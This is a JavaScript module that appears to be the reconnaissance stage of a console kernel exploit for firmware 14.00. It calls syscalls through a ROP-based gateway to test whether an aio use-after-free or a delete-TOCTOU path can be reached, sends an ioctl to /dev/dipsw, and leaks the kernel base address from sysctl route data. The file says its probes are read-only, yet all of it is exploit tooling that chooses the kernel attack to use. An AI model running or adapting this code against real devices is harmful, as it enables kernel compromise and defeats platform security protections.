// probes1400.js -- door map for 14.00, run before any kernel write.
//
// Contract: same as the fork's hx1400_port.js -- ctx must provide
//   sc(num, ...args) -> int64-like with .i32
//   bufAddr(arrayBuffer) -> int64-like
//   keepAlive: array      (buffers must stay reachable or the GC frees them)
//   mark(tag, detail)     (optional; falls back to console.log)
//
// Every probe is read-only. The only device probe is single-shot and
// opt-in (ctx.allowDeviceProbe === true). Anything that would write kernel
// memory is deliberately absent -- see README.

export const S = {
  getpid: 20,
  getuid: 24,
  open: 5,
  close: 6,
  ioctl: 54,
  sysctl: 202,
  aio_multi_delete: 662,
  aio_multi_wait: 663,
  aio_multi_poll: 664,
  aio_multi_cancel: 666,
  aio_submit_cmd: 669,
};

// Every syscall this module needs a stub for. boot.js scans for exactly this
// list, so adding a probe here is the only place the stub set has to change.
export const PROBE_SYSCALLS = Object.keys(S).map(function (k) {
  return S[k];
});

// aio request stride observed in the fork's makeAioSet(): 40 bytes each.
const AIO_REQ = 40;
const AIO_N = 5;

const results = [];
let ctx = null;

function mark(tag, detail) {
  if (ctx && typeof ctx.mark === "function") ctx.mark(tag, detail);
  else console.log(tag + (detail ? "  " + detail : ""));
}

function record(name, verdict, detail) {
  results.push({ name: name, verdict: verdict, detail: detail || "" });
  mark("PROBE", name + " " + verdict + (detail ? "  " + detail : ""));
}

function buf(size) {
  const ab = new ArrayBuffer(size);
  const dv = new DataView(ab);
  const u8 = new Uint8Array(ab);
  if (ctx.keepAlive) ctx.keepAlive.push(ab, dv, u8);
  return { ab: ab, dv: dv, u8: u8, addr: ctx.bufAddr(ab) };
}

function putU32(b, off, v) { b.dv.setUint32(off, v >>> 0, true); }
function putI32(b, off, v) { b.dv.setInt32(off, v | 0, true); }
function getU32(b, off) { return b.dv.getUint32(off, true) >>> 0; }
function getI32(b, off) { return b.dv.getInt32(off, true) | 0; }
function putU64(b, off, v) {
  const w = BigInt(v);
  b.dv.setUint32(off, Number(w & 0xffffffffn), true);
  b.dv.setUint32(off + 4, Number((w >> 32n) & 0xffffffffn), true);
}
function getU64(b, off) {
  return getU32(b, off + 4) * 0x100000000 + getU32(b, off);
}
function cstr(s) {
  const b = buf(s.length + 1);
  for (let i = 0; i < s.length; i++) b.u8[i] = s.charCodeAt(i) & 0xff;
  b.u8[s.length] = 0;
  return b;
}
function now() {
  return (typeof performance !== "undefined" && performance.now)
    ? performance.now() : Date.now();
}
function errnoText() {
  try {
    if (ctx && typeof ctx.errno === "function") return " errno=" + ctx.errno();
  } catch (e) { /* not wired */ }
  return "";
}

// ---------------------------------------------------------------- probes

function probeBaseline() {
  const pid = ctx.sc(S.getpid).i32;
  const uid = ctx.sc(S.getuid).i32;
  if (pid > 0) record("BASELINE", "PASS", "pid=" + pid + " uid=" + uid);
  else record("BASELINE", "FAIL", "getpid=" + pid + " (gateway broken)");
  return pid > 0;
}

// The load-bearing question for every aio-family primitive: does the wait
// actually block, or does it return immediately having created nothing?
function probeAioWaitSleep() {
  const req = buf(AIO_N * AIO_REQ);
  const ids = buf(AIO_N * 4);
  const status = buf(AIO_N * 4);
  const timeout = buf(8);

  for (let i = 0; i < AIO_N; i++) {
    putU32(req, i * AIO_REQ + 8, 0);
    putI32(req, i * AIO_REQ + 32, -1);
  }
  putU64(timeout, 0, 50000); // 50 ms in us

  let submitRv;
  try {
    submitRv = ctx.sc(
      S.aio_submit_cmd, 4097, req.addr, AIO_N, 3, ids.addr,
    ).i32;
  } catch (e) {
    record("AIO-WAIT", "UNKNOWN", "submit threw: " + e.message);
    return;
  }

  if (submitRv !== 0) {
    record("AIO-WAIT", "CLOSED", "submit rv=" + submitRv + errnoText());
    return;
  }

  let live = 0;
  for (let i = 0; i < AIO_N; i++) if (getI32(ids, i * 4) !== 0) live++;
  if (live === 0) {
    record("AIO-WAIT", "CLOSED", "submit returned no ids");
    return;
  }

  const t0 = now();
  let waitRv = 0;
  try {
    waitRv = ctx.sc(
      S.aio_multi_wait, ids.addr, live, status.addr, 0, timeout.addr,
    ).i32;
  } catch (e) {
    record("AIO-WAIT", "UNKNOWN", "wait threw: " + e.message);
  }
  const elapsed = now() - t0;

  // Best-effort teardown so the queue is not left armed.
  try {
    ctx.sc(S.aio_multi_cancel, ids.addr, live, status.addr);
    ctx.sc(S.aio_multi_delete, ids.addr, live, status.addr);
  } catch (e) { /* ignore */ }

  // <5 ms = pure ROP overhead: no waiter was ever built.
  const verdict = elapsed < 5 ? "GATED" : (elapsed >= 40 ? "SLEEPS" : "AMBIGUOUS");
  record("AIO-WAIT", verdict,
    "rv=" + waitRv + errnoText() + " elapsed=" + elapsed.toFixed(1) + "ms live=" + live);

  if (verdict === "SLEEPS") {
    mark("PROBE-NOTE", "wait blocks -- the aio UAF door is live on this build");
  } else if (verdict === "GATED") {
    mark("PROBE-NOTE", "wait returns at once -- aio-wait UAF cannot land; use delete-TOCTOU");
  }
}

function probeAioDelete() {
  const req = buf(AIO_N * AIO_REQ);
  const ids = buf(AIO_N * 4);
  const status = buf(AIO_N * 4);

  for (let i = 0; i < AIO_N; i++) {
    putU32(req, i * AIO_REQ + 8, 0);
    putI32(req, i * AIO_REQ + 32, -1);
  }

  const submitRv = ctx.sc(S.aio_submit_cmd, 4097, req.addr, AIO_N, 3, ids.addr).i32;
  if (submitRv !== 0) {
    record("AIO-DELETE", "CLOSED", "submit rv=" + submitRv + errnoText());
    return;
  }

  let live = 0;
  for (let i = 0; i < AIO_N; i++) if (getI32(ids, i * 4) !== 0) live++;
  if (live === 0) { record("AIO-DELETE", "CLOSED", "no ids"); return; }

  const delRv = ctx.sc(S.aio_multi_delete, ids.addr, live, status.addr).i32;
  let cleared = 0;
  for (let i = 0; i < AIO_N; i++) if (getI32(status, i * 4) === 0) cleared++;

  const verdict = delRv === 0 ? "ALIVE" : "CLOSED";
  record("AIO-DELETE", verdict,
    "rv=" + delRv + errnoText() + " cleared=" + cleared + "/" + live);
}

function probeAioPoll() {
  const req = buf(AIO_N * AIO_REQ);
  const ids = buf(AIO_N * 4);
  const status = buf(AIO_N * 4);

  for (let i = 0; i < AIO_N; i++) {
    putU32(req, i * AIO_REQ + 8, 0);
    putI32(req, i * AIO_REQ + 32, -1);
  }

  const submitRv = ctx.sc(S.aio_submit_cmd, 4097, req.addr, AIO_N, 3, ids.addr).i32;
  if (submitRv !== 0) { record("AIO-POLL", "CLOSED", "submit rv=" + submitRv); return; }

  let live = 0;
  for (let i = 0; i < AIO_N; i++) if (getI32(ids, i * 4) !== 0) live++;

  const pollRv = ctx.sc(S.aio_multi_poll, ids.addr, live, status.addr).i32;
  let notDone = 0;
  for (let i = 0; i < AIO_N; i++) if (getI32(status, i * 4) === 0) notDone++;

  try {
    ctx.sc(S.aio_multi_cancel, ids.addr, live, status.addr);
    ctx.sc(S.aio_multi_delete, ids.addr, live, status.addr);
  } catch (e) { /* ignore */ }

  record("AIO-POLL", pollRv === 0 ? "ALIVE" : "CLOSED",
    "rv=" + pollRv + " pending=" + notDone + "/" + live);
}

// Single-shot device probe. Off unless explicitly armed.
function probeDipsw() {
  if (!ctx.allowDeviceProbe) {
    record("DIPSW", "SKIPPED", "allowDeviceProbe not set");
    return;
  }

  const path = cstr("/dev/dipsw");
  const fd = ctx.sc(S.open, path.addr, 0, 0).i32;
  if (fd < 0) {
    record("DIPSW", "CLOSED", "open fd=" + fd + errnoText());
    return;
  }

  record("DIPSW-OPEN", "PASS", "fd=" + fd);

  // Exactly one command, the documented window start. Never a sweep.
  const cmd = 0x80028800;
  const out = buf(64);
  out.u8.fill(0);

  let ioRv = 0;
  try {
    ioRv = ctx.sc(S.ioctl, fd, cmd, 0, 0).i32;
  } catch (e) {
    record("DIPSW-IOCTL", "UNKNOWN", "threw: " + e.message);
  }

  try { ctx.sc(S.close, fd); } catch (e) { /* ignore */ }

  record("DIPSW-IOCTL", ioRv === 0 ? "ACCEPTED" : "REFUSED",
    "cmd=0x" + cmd.toString(16) + " rv=" + ioRv + errnoText());
}

// Kernel base via the sysctl route walk + anchor subtraction.
function probeKbase(anchorRva) {
  const anchor = anchorRva || 0;
  const mib = buf(32);
  const out = buf(32768);
  const len = buf(8);
  const values = [4, 17, 0, 28, 1, 0];

  for (let i = 0; i < values.length; i++) putI32(mib, i * 4, values[i]);

  putU64(len, 0, 0);
  const routeRv = ctx.sc(S.sysctl, mib.addr, 6, 0, len.addr, 0, 0).i32;
  const routeLen = getU64(len, 0);

  if (routeRv !== 0) {
    record("SYSCTL-ROUTE", "CLOSED", "rv=" + routeRv + errnoText());
    return 0;
  }

  putU64(len, 0, 32768);
  const readRv = ctx.sc(S.sysctl, mib.addr, 6, out.addr, len.addr, 0, 0).i32;
  const used = Math.min(getU64(len, 0), out.ab.byteLength);

  if (readRv !== 0 || used === 0) {
    record("SYSCTL-READ", "CLOSED", "rv=" + readRv + " used=" + used);
    return 0;
  }

  if (!anchor) {
    record("SYSCTL-READ", "PASS", "used=" + used + " anchor=absent (no kbase derivation)");
    return 0;
  }

  let off = 0, hits = 0, base = 0, conflict = false;
  while (off + 16 <= used) {
    const recLen = out.dv.getUint16(off, true);
    if (recLen < 16 || off + recLen > used) break;
    if ((out.u8[off + 3] & 0xff) === 4 && recLen >= 40) {
      const lo = getU32(out, off + 32);
      const hi = getU32(out, off + 36);
      if (hi === 0xffffffff && lo !== 0 && lo !== 0xffffffff) {
        const cand = hi * 0x100000000 + lo - anchor;
        if ((cand % 0x4000) === 0 && Math.floor(cand / 0x100000000) === 0xffffffff) {
          if (hits === 0) base = cand;
          else if (base !== cand) conflict = true;
          hits++;
        }
      }
    }
    off += recLen;
  }

  if (hits > 0 && !conflict) {
    record("KBASE", "PASS", "base=0x" + base.toString(16) + " hits=" + hits);
    return base;
  }
  record("KBASE", "UNRESOLVED",
    "hits=" + hits + " conflict=" + (conflict ? 1 : 0) + " used=" + used);
  return 0;
}

// ---------------------------------------------------------------- entry

export async function runProbes(c) {
  ctx = c;
  results.length = 0;

  mark("PROBE-START", "read-only door map, no kernel writes");

  try {
    if (!probeBaseline()) {
      mark("PROBE-END", "aborted: no syscall gateway");
      return results;
    }
    probeAioDelete();
    probeAioPoll();
    probeAioWaitSleep();
    probeDipsw();
    probeKbase(ctx.anchorRva || 0);
  } catch (e) {
    record("PROBE-THREW", "FAIL", (e && e.message) || String(e));
  }

  const tally = {};
  for (const r of results) tally[r.verdict] = (tally[r.verdict] || 0) + 1;
  mark("PROBE-END", Object.keys(tally).map(function (k) { return k + "=" + tally[k]; }).join(" "));

  return results;
}

export function probeResults() { return results.slice(); }
